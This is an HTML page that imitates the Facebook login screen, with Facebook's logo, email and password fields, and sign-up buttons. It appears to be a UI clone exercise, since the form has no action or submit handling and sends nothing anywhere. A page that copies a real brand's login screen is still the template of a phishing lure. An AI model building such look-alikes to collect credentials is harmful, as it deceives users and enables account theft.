<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Facebook - Login</title>
        <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
        <link href='http://fonts.googleapis.com/css?family=Lato&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
        <link rel="stylesheet" type="text/css" href="css/styles.css">
        <meta name="viewport" content="width=device-width, initial-scale=1">
    </head>
    <body>
        <h1>facebook</h1>
        <div class="img-container">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="facebook">
            
        </div>
        <div class="card">
            <h3>Log in to Facebook</h3>
            <form action="" method="POST">
                <label class="standard-label" for="contact-email"></label>
                <input type="text" id="contact-email" placeholder="Email address or phone number" required>
                <label class="standard-label" for="password"></label>
                <input type="password" id="password" placeholder="Password">
                <button type="button" id="loginbutton" class="btn">Log In</button>
                <a href="#" class="link-primary">Forgotten account?</a>
                <hr>
                <span>or</span>
                <button type="button" class="btn_secondary">Create New Account</button>
            </form>
        </div>
    </body>
</html>
